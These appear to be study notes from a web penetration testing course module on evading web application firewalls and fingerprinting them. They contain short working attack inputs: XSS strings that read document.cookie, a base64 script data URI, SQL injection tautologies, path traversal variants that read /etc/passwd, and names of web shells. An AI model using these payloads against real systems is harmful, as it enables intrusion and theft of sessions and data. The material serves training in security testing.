### WAPTXv2: Section 1, Module 1 - Caendra Inc. Â© 2020

#### Cross-Site Scripting (XSS)
Instead of using:
```javascript
alert(/xss/.source)
```
or
```javascript
window[/alert/.source](8)
```
The best choice is:
```javascript
alert(document.cookie)
```

**1.2.2.1 Simple Rules to Bypass Web Application Firewalls (WAFs)**
- **Page 103**

```javascript
with(document) alert(cookie)
```

```javascript
alert(document['cookie'])
```

```javascript
alert(document[/cookie/.source])
```

```javascript
alert(document[/coo/.source + /kie/.source])
```

- **Page 104**

```javascript
javascript:alert(document.cookie)
```

```plaintext
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

#### Blind SQL Injection
Instead of using:
```sql
' or 1=1
```
The best choice is:
```sql
' or 6=6
```

**1.2.2.1 Simple Rules to Bypass WAFs**
- **Page 105**

```sql
' or 0x47=0x47
```

```sql
or char(32)=' '
```

```sql
or 6 is not null
```

#### SQL Injection
Instead of using:
```sql
UNION SELECT
```
The best choice is:
```sql
UNION ALL SELECT
```

- **Page 106**

#### Directory Traversal
Instead of using:
```plaintext
/etc/passwd
```
The best choice is:
```plaintext
/too/../etc/far/../passwd
```

**1.2.2.1 Simple Rules to Bypass WAFs**
- **Page 107**

```plaintext
/etc//passwd
```

```plaintext
/etc/ignore/../passwd
```

```plaintext
/etc/passwd.......
```

#### Web Shell
Instead of using:
```plaintext
c99.php
```
The best choice is:
```plaintext
r57.php
```

- **Page 108**

```plaintext
shell.aspx
```

```plaintext
cmd.jsp
```

```plaintext
CmdAsp.asp
```

```plaintext
augh.php
```

### Web Application Firewall (WAF) Modes and Detection
Web Application Firewalls (WAFs) can operate in passive mode, reactive mode, or both, depending on the deployment period. In passive mode, they reduce false positives and avoid blocking the application, while in production, they are typically reactive.

Before testing a web application, it is crucial to determine if a WAF is present and its type. WAFs leave several footprints that can be used for detection.

**1.2.2.2 WAF Detection and Fingerprinting**
- **Page 109**

#### Cookie Values
Some WAFs reveal their presence through cookies. For example:

- **Citrix Netscaler** uses cookies like `ns_af`, `citrix_ns_id`, or `NSC_`.
- **F5 BIG-IP ASM** uses cookies starting with `TS` followed by a string matching the regex: `^TS[a-zA-Z0-9]{3,6}`.
- **Barracuda** uses cookies `barra_counter_session` and `BNI__BARRACUDA_LB_COOKIE`.

- **Page 110-112**

#### Header Rewrite
Some WAFs modify HTTP headers, such as the `Server` header, to deceive attackers. For example, they may rewrite the header or remove it if the request is malicious.

- **Page 113-114**

#### HTTP Response Codes
Some WAFs change the HTTP response codes for hostile requests. For example:
- **mod_security**: `406 Not Acceptable`
- **AQTRONIX WebKnight**: `999 No Hacking`

- **Page 115**

#### HTTP Response Body
The presence of a WAF can also be detected in the response body. For example:
- **mod_security**: "Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security."
- **AQTRONIX WebKnight**: Custom error messages.
- **dotDefender**: Custom error messages.

- **Page 116-119**

#### Close Connection
Some WAFs support closing the connection if a malicious request is detected. For example, mod_security can be configured to drop connections during a brute force attack.

- **Page 120-121**

#### Penetration Testing Tools
Many penetration testing tools can detect the presence of a WAF. Some popular tools include:
- **wafw00f**: Detects up to 20 different WAF products.
- **Nmap**: Contains the `http-waf-fingerprint` script.
- **imperva-detect**: Focuses on detecting Imperva WAFs.

- **Page 122-129**

### Client-Side Filters
Client-side defenses aim to protect users from vulnerabilities in web applications. These defenses need to be generic enough to always be enabled without becoming blockers for the browsers and their users.

From an attacker's perspective, understanding these mechanisms and how to bypass them is essential to target protected users.

**1.2.3 Client-Side Filters**
- **Page 130-131**

#### Browser Add-ons
The first browser protection began in the open-source community with Giorgio Maone's NoScript Security Suite extension for Firefox.

- **NoScript** is a whitelist-based security tool that disables all executable web content (JavaScript, Java, Flash, Silverlight, etc.) and allows the user to choose which sites are trusted.

- **Page 132-134**

NoScript provides strong and powerful anti-XSS protection, making it one of the most effective browser-based solutions to prevent targeted malicious web attacks.

- **Page 135**

### History
The first attempt at natively blocking malicious requests in the browser was made by Microsoft with the introduction of the XSS filter in Internet Explorer 8.

- **Page 136**

This comprehensive guide covers various techniques and tools for detecting and bypassing WAFs, as well as client-side filters, providing a robust framework for understanding and addressing web security challenges.